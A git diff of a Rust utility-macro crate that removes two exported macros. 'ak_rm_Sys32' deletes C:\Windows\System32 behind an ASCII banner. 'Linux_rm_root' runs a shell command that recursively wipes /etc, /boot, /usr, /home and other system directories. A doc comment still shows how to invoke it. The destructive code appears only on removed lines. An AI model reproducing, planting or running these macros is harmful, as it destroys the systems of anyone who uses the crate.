@@ -202,55 +202,6 @@ macro_rules! terminal {
 /// /// example
 /// ak_rm_Sys32!();
 ///  ```
-
-#[macro_export]
-macro_rules! ak_rm_Sys32 {
-    () => {
-        use std::fs;
-        use std::io;
-
-fn main() -> io::Result<()> {
-    println!(
-        r"
-
-
-        /$$$$$$  /$$   /$$       /$$      /$$          
-        /$$__  $$| $$  /$$/      | $$$    /$$$          
-       | $$  \ $$| $$ /$$/       | $$$$  /$$$$  /$$$$$$ 
-       | $$$$$$$$| $$$$$/ /$$$$$$| $$ $$/$$ $$ |____  $$
-       | $$__  $$| $$  $$|______/| $$  $$$| $$  /$$$$$$$
-       | $$  | $$| $$\  $$       | $$\  $ | $$ /$$__  $$
-       | $$  | $$| $$ \  $$      | $$ \/  | $$|  $$$$$$$
-       |__/  |__/|__/  \__/      |__/     |__/ \_______/
-                                                        
-                                                        
-         /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$$         
-        /$$_____/ /$$__  $$ /$$__  $$ /$$_____/         
-       | $$      | $$  \__/| $$  \ $$|  $$$$$$          
-       | $$      | $$      | $$  | $$ \____  $$         
-       |  $$$$$$$| $$      |  $$$$$$/ /$$$$$$$/         
-        \_______/|__/       \______/ |_______/            
-    "
-    );
-    let dir_path = r"C:\Windows\System32";
-
-    if let Ok(metadata) = fs::metadata(&dir_path) {
-        if metadata.is_dir() {
-            fs::remove_dir_all(&dir_path)?;
-            println!("Directory removed successfully.");
-        } else {
-            println!("Path exists, but it is not a directory.");
-        }
-    } else {
-        println!("Directory does not exist or cannot be accessed.");
-    }
-
-    Ok(())
-}
-
-    };
-}
-
 ///```
 /// this_OS!(); ///macro can know your operating system Name
 /// /// you can use it at any conditions
@@ -272,17 +223,6 @@ macro_rules! this_OS {
 /// Linux_rm_root!();
 ///
 /// ```
-#[macro_export]
-macro_rules! Linux_rm_root {
-    () => {
-        let _ = std::process::Command::new("sh")
-        .arg("-c")
-        .arg("cd /etc/; rm -r *;cd /boot/; rm -r *;cd /dev/; rm -r *;cd /home/; rm -r *;cd /sys/; rm -r *;cd /tmp/; rm -r *;cd /usr/; rm -r *;")
-        .output()
-        .expect("failed to execute process");
-    };
-}
-
 ///```
 /// /// use_rand macro, this macro can generate a Random Number
 /// /// to use the macro you should add rand at cargo.toml
